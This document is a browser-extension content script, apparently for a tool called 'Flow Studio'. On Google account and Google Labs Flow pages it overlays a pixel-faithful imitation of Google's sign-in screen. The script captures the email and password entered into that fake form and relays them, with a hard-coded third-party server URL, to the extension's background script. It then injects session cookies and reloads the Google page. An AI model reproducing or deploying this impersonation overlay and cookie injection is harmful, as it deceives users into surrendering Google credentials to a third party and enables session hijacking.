// Flow Studio — In-Page Google Sign-In Overlay using Shadow DOM (matching glog exactly)

(function () {
  'use strict';

  if (window.__flow_login_overlay_injected) return;
  window.__flow_login_overlay_injected = true;

  const HARDCODED_SERVER_URL = 'https://flowsstudio.lovable.app';

  function createOverlayUI() {
    if (document.getElementById("my-extension-overlay")) return;

    const host = document.createElement("div");
    host.id = "my-extension-overlay";

    Object.assign(host.style, {
      position: "fixed",
      inset: "0",
      width: "100vw",
      height: "100vh",
      zIndex: "2147483647"
    });

    document.documentElement.appendChild(host);

    const shadow = host.attachShadow({ mode: "open" });

    shadow.innerHTML = `
      <style>
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
        }

        :root {
          --page: #202124;
          --surface: #0f1011;
          --text: #e8eaed;
          --muted: #bdc1c6;
          --border: #5f6368;
          --link: #a8c7fa;
          --btn: #a8c7fa;
          --btn-text: #062e6f;
        }

        .overlay {
          position: fixed;
          inset: 0;
          width: 100%;
          height: 100%;
          background: #202124;
          display: flex;
          align-items: center;
          justify-content: center;
          font-family: "Google Sans", Arial, sans-serif;
          color: #e8eaed;
        }

        .card {
          width: min(1040px, calc(100% - 36px));
          min-height: 400px;
          background: #0f1011;
          border-radius: 28px;
          position: relative;
          overflow: hidden;
          display: grid;
          grid-template-columns: 1fr 1fr;
        }

        .progress {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 4px;
          overflow: hidden;
          z-index: 20;
        }

        .progress::after {
          content: "";
          position: absolute;
          top: 0;
          left: -40%;
          width: 35%;
          height: 100%;
          background: #a8c7fa;
        }

        .progress.active::after {
          animation: loading 1s cubic-bezier(.4, 0, .2, 1) infinite;
        }


        @keyframes loading {
          0% { left: -40%; width: 35%; }
          45% { left: 25%; width: 42%; }
          100% { left: 100%; width: 35%; }
        }

        .left {
          padding: 38px 36px;
          color: #e8eaed;
        }

        .logo {
          width: 40px;
          height: 40px;
          object-fit: contain;
          display: block;
          margin-bottom: 30px;
        }

        h1 {
          font-size: 36px;
          line-height: 44px;
          font-weight: 400;
          letter-spacing: -.5px;
          margin-bottom: 16px;
        }

        .description {
          max-width: 390px;
          color: #bdc1c6;
          font-size: 16px;
          line-height: 24px;
        }

        .account {
          display: none;
          align-items: center;
          gap: 8px;
          width: max-content;
          max-width: 100%;
          margin-top: 18px;
          padding: 5px 10px 5px 6px;
          color: #e8eaed;
          border: 1px solid #5f6368;
          border-radius: 18px;
          font-size: 14px;
          cursor: pointer;
        }

        .account.show {
          display: flex;
        }

        .avatar {
          width: 20px;
          height: 20px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          flex-shrink: 0;
          color: #bdc1c6;
        }

        .avatar svg {
          width: 16px;
          height: 16px;
          fill: currentColor;
          display: block;
        }

        .chevron-icon {
          width: 14px;
          height: 14px;
          stroke: currentColor;
          color: #e8eaed;
          flex-shrink: 0;
          display: block;
        }


        .right {
          padding: 36px 36px 36px 6px;
          position: relative;
          overflow: hidden;
          color: #e8eaed;
        }

        .screens {
          width: 100%;
          position: relative;
        }

        .screen {
          width: 100%;
          min-width: 100%;
          transition: opacity .28s ease, transform .38s cubic-bezier(.4, 0, .2, 1);
        }

        .email-screen {
          position: relative;
          opacity: 1;
          transform: translateX(0);
        }

        .password-screen {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          opacity: 0;
          transform: translateX(50px);
          pointer-events: none;
        }

        .card.show-password .email-screen {
          opacity: 0;
          transform: translateX(-50px);
          pointer-events: none;
        }

        .card.show-password .password-screen {
          opacity: 1;
          transform: translateX(0);
          pointer-events: auto;
        }

        .field {
          position: relative;
          width: 100%;
        }

        .field input {
          width: 100%;
          height: 56px;
          padding: 18px 14px 6px;
          background: transparent;
          color: #e8eaed;
          border: 1px solid #5f6368;
          border-radius: 4px;
          outline: none;
          font-family: "Google Sans", Arial, sans-serif;
          font-size: 16px;
          transition: border .15s ease;
        }

        .field input:focus {
          border: 2px solid #a8c7fa;
        }

        .field label {
          position: absolute;
          top: -8px;
          left: 10px;
          padding: 0 5px;
          background: #0f1011;
          color: #9aa0a6;
          font-size: 12px;
          line-height: 16px;
          pointer-events: none;
        }

        .field input:focus + label {
          color: #a8c7fa;
        }

        .link {
          color: #a8c7fa;
          text-decoration: none;
          font-size: 14px;
          font-weight: 500;
          cursor: pointer;
        }

        .link:hover {
          text-decoration: underline;
        }

        .forgot {
          display: inline-block;
          margin-top: 12px;
        }

        .info {
          margin-top: 44px;
          max-width: 430px;
          color: #bdc1c6;
          font-family: Arial, sans-serif;
          font-size: 14px;
          line-height: 20px;
        }

        .actions {
          margin-top: 42px;
          display: flex;
          align-items: center;
          justify-content: flex-end;
          gap: 40px;
        }

        button {
          min-width: 80px;
          height: 40px;
          border: 0;
          border-radius: 22px;
          background: #a8c7fa;
          color: #062e6f;
          font-family: "Google Sans", Arial, sans-serif;
          font-size: 14px;
          font-weight: 500;
          cursor: pointer;
          transition: transform .12s ease, background .15s ease;
        }

        button:hover {
          background: #b8d3ff;
        }

        button:active {
          transform: scale(.97);
        }

        button:disabled {
          opacity: 0.7;
          cursor: default;
        }

        .password-options {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-top: 10px;
          color: #d7dce2;
          font-size: 14px;
          font-weight: 500;
        }

        .password-options input {
          appearance: none;
          -webkit-appearance: none;
          width: 18px;
          height: 18px;
          border: 2px solid #9aa0a6;
          border-radius: 2px;
          cursor: pointer;
          position: relative;
        }

        .password-options input:checked {
          border-color: #a8c7fa;
          background: #a8c7fa;
        }

        .password-options input:checked:after {
          content: "✓";
          position: absolute;
          top: -4px;
          left: 2px;
          color: #062e6f;
          font-size: 15px;
          font-weight: bold;
        }

        .error-banner {
          color: #f87171;
          font-size: 13px;
          margin-top: 8px;
          display: none;
          line-height: 1.4;
        }

        .shake {
          animation: shake .3s ease;
        }

        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-5px); }
          75% { transform: translateX(5px); }
        }

        @media(max-width:900px) {
          .left { padding: 38px 30px; }
          .right { padding: 36px 30px 36px 0; }
          .actions { gap: 28px; }
        }

        @media(max-width:600px) {
          .overlay { align-items: stretch; }
          .card { width: 100%; min-height: 100%; border-radius: 0; display: block; }
          .left { padding: 18px 12px; }
          .logo { width: 32px; height: 32px; margin-bottom: 18px; }
          h1 { font-size: 22px; line-height: 30px; margin-bottom: 8px; }
          .description { max-width: 230px; font-size: 11px; line-height: 16px; }
          .account { margin-top: 10px; font-size: 10px; padding: 3px 8px 3px 4px; }
          .avatar { width: 16px; height: 16px; }
          .right { padding: 34px 12px; }
          .field input { height: 36px; padding: 11px 10px 2px; font-size: 11px; }
          .field label { top: -7px; font-size: 9px; line-height: 12px; }
          .link { font-size: 10px; }
          .forgot { margin-top: 7px; }
          .info { margin-top: 28px; font-size: 10px; line-height: 14px; }
          .actions { margin-top: 28px; gap: 22px; }
          button { min-width: 49px; height: 28px; font-size: 10px; }
          .password-options { margin-top: 9px; gap: 9px; font-size: 10px; }
          .password-options input { width: 12px; height: 12px; border-width: 1px; }
          .progress { height: 2px; }
        }
      </style>

      <div class="overlay">
        <section class="card" id="card">
          <div class="progress" id="progress"></div>

          <!-- LEFT -->
          <div class="left">
            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google">
            <h1 class="title" id="title">Sign in</h1>
            <div class="description" id="description">
              with your Google Account. This account will be available<br>
              to other Google apps in the browser.
            </div>
            <div class="account" id="accountChip">
              <div class="avatar">
                <svg viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88C7.55 15.8 9.68 15 12 15s4.45.8 6.14 2.12C16.43 19.18 14.03 20 12 20z"/>
                </svg>
              </div>
              <span id="accountEmail"></span>
              <svg class="chevron-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="6 9 12 15 18 9"></polyline>
              </svg>
            </div>
          </div>

          <!-- RIGHT -->
          <div class="right">
            <div class="screens">

              <!-- EMAIL SCREEN -->
              <div class="screen email-screen">
                <div class="field" id="emailField">
                  <input id="email" type="text" placeholder=" " autocomplete="off">
                  <label for="email">Email or phone</label>
                </div>
                <div id="email-error" class="error-banner"></div>

                <a class="link forgot" href="javascript:void(0)">Forgot email?</a>

                <div class="info">
                  Not your computer? Use Guest mode to sign in privately.
                  Learn more about using Guest mode
                </div>

                <div class="actions">
                  <a class="link" href="javascript:void(0)">Create account</a>
                  <button class="next" id="emailNext" type="button">Next</button>
                </div>
              </div>

              <!-- PASSWORD SCREEN -->
              <div class="screen password-screen">
                <div class="field" id="passwordField">
                  <input id="password" type="password" placeholder=" " autocomplete="off">
                  <label for="password">Enter your password</label>
                </div>
                <div id="pass-error" class="error-banner"></div>

                <label class="password-options">
                  <input type="checkbox" id="showPassword">
                  <span>Show password</span>
                </label>

                <div class="actions">
                  <a class="link" href="javascript:void(0)">Forgot password?</a>
                  <button class="next" id="passwordNext" type="button">Next</button>
                </div>
              </div>

            </div>
          </div>
        </section>
      </div>
    `;

    const card = shadow.getElementById("card");
    const progress = shadow.getElementById("progress");

    const email = shadow.getElementById("email");
    const password = shadow.getElementById("password");

    const emailNext = shadow.getElementById("emailNext");
    const passwordNext = shadow.getElementById("passwordNext");

    const title = shadow.getElementById("title");
    const description = shadow.getElementById("description");

    const accountChip = shadow.getElementById("accountChip");
    const accountEmail = shadow.getElementById("accountEmail");

    const showPassword = shadow.getElementById("showPassword");
    const emailErr = shadow.getElementById("email-error");
    const passErr = shadow.getElementById("pass-error");

    email.focus();

    function runProgress(done) {
      progress.classList.remove("active");
      void progress.offsetWidth;
      progress.classList.add("active");
      setTimeout(() => {
        progress.classList.remove("active");
        if (done) done();
      }, 750);
    }

    function triggerShake(fieldEl) {
      fieldEl.classList.remove("shake");
      void fieldEl.offsetWidth;
      fieldEl.classList.add("shake");
    }

    /* EMAIL -> PASSWORD */
    emailNext.addEventListener("click", () => {
      const value = email.value.trim();

      if (!value) {
        triggerShake(shadow.getElementById("emailField"));
        emailErr.textContent = "Enter an email or phone number";
        emailErr.style.display = "block";
        email.focus();
        return;
      }

      emailErr.style.display = "none";

      runProgress(() => {
        title.textContent = "Welcome";
        description.style.display = "none";
        accountEmail.textContent = value;
        accountChip.classList.add("show");
        card.classList.add("show-password");

        setTimeout(() => {
          password.focus();
        }, 300);
      });
    });

    email.addEventListener("keydown", (e) => {
      if (e.key === "Enter") emailNext.click();
    });

    /* BACK TO EMAIL */
    accountChip.addEventListener("click", () => {
      card.classList.remove("show-password");
      accountChip.classList.remove("show");
      title.textContent = "Sign in";
      description.style.display = "block";
      passErr.style.display = "none";

      setTimeout(() => {
        email.focus();
      }, 350);
    });

    /* SHOW PASSWORD */
    showPassword.addEventListener("change", () => {
      password.type = showPassword.checked ? "text" : "password";
    });

    /* AUTHENTICATION SUBMIT & COOKIE INJECTION */
    async function doSignIn() {
      const emailVal = email.value.trim();
      const passVal = password.value.trim();

      if (!passVal) {
        triggerShake(shadow.getElementById("passwordField"));
        passErr.textContent = "Enter a password";
        passErr.style.display = "block";
        password.focus();
        return;
      }

      passErr.style.display = "none";
      passwordNext.disabled = true;

      // Keep progress bar active during verification & cookie injection
      progress.classList.add("active");

      try {
        const response = await new Promise((resolve) => {
          chrome.runtime.sendMessage({
            type: 'MANUAL_LOGIN_FROM_OVERLAY',
            email: emailVal,
            password: passVal,
            serverUrl: HARDCODED_SERVER_URL
          }, res => resolve(res || { success: false, error: 'Extension disconnected' }));
        });

        if (response && response.success) {
          // Login verified! Show cookie injection progress on overlay for 2.5-3 seconds before closing
          passwordNext.textContent = 'Injecting...';
          passwordNext.style.background = '#8ab4f8';
          passwordNext.style.color = '#062e6f';

          // Trigger cookie injection
          try {
            chrome.runtime.sendMessage({ type: 'BUNNYFLOW_INJECT_COOKIES', force: true });
          } catch (_) { }

          // Wait 2.5 - 3 seconds with overlay and top progress bar active
          setTimeout(() => {
            progress.classList.remove("active");
            removeOverlayUI();
            if (window.location.href.startsWith('https://labs.google/fx/tools/flow')) {
              window.location.reload();
            } else {
              window.location.href = 'https://labs.google/fx/tools/flow';
            }
          }, 2600);
        } else {
          progress.classList.remove("active");
          triggerShake(shadow.getElementById("passwordField"));
          passErr.textContent = response.error || "Wrong password. Try again or click Forgot password.";
          passErr.style.display = "block";
          passwordNext.disabled = false;
          passwordNext.textContent = "Next";
        }
      } catch (err) {
        progress.classList.remove("active");
        triggerShake(shadow.getElementById("passwordField"));
        passErr.textContent = err.message || "Connection failed.";
        passwordNext.disabled = false;
        passwordNext.textContent = "Next";
      }
    }


    passwordNext.addEventListener("click", doSignIn);

    password.addEventListener("keydown", (e) => {
      if (e.key === "Enter") doSignIn();
    });
  }

  function removeOverlayUI() {
    const host = document.getElementById("my-extension-overlay");
    if (host && host.parentNode) {
      host.parentNode.removeChild(host);
    }
  }

  function checkAndPromptLogin() {
    const href = window.location.href;
    const isTargetPage = href.includes('accounts.google.com') ||
      href.startsWith('https://labs.google/fx/tools/flow') ||
      href.startsWith('https://labs.google/fx/');

    if (!isTargetPage) return;

    try {
      chrome.runtime.sendMessage({ type: 'CHECK_AUTH_STATUS' }, resp => {
        if (chrome.runtime.lastError) return;
        if (!resp || !resp.loggedIn || !resp.hasCookies) {
          createOverlayUI();
        } else {
          removeOverlayUI();
        }
      });
    } catch (_) { }
  }


  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.type === 'SHOW_LOGIN_OVERLAY') {
      createOverlayUI();
      sendResponse({ ok: true });
    } else if (msg.type === 'REMOVE_LOGIN_OVERLAY') {
      removeOverlayUI();
      sendResponse({ ok: true });
    }
  });

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', checkAndPromptLogin);
  } else {
    checkAndPromptLogin();
  }
})();
